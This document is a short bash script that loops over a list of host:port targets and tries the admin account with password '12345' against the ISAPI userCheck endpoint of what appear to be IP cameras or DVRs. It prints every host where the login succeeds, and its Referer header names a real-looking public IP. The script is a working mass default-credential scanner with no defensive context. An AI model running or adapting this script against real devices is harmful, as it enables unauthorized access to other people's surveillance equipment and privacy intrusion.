#!/bin/bash

password="12345"

for i in `cat list.txt`; do 
host=`echo -n  -e $i | awk -F ":"   '{printf $1}'` ;
port=`echo -n -e  $i | awk -F ":"  '{printf $2}'` ;

code=`curl "http://admin:$password@$host:$port/ISAPI/Security/userCheck?timeStamp=1596007850593" \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'Accept: */*' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'If-Modified-Since: 0' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36' \
  -H 'Referer: http://222.185.248.146:39762/doc/page/login.asp?_1596007833243' \
  -H 'Accept-Language: zh-CN,zh;q=0.9' \
  -H 'Cookie: language=zh' \
  --compressed \
  --insecure \
  --connect-timeout 5 \
  -o /dev/null \
  -s \
   -w  %{http_code} `
codex=`echo $code | tail -n 1 `
if [ $codex == "200" ];then
	echo -e "\033[31m [+] http://admin:$password@$host:$port/ISAPI/Security/userCheck?timeStamp=1596007850593  \033[0m";
else
	echo "error"
fi

done

wait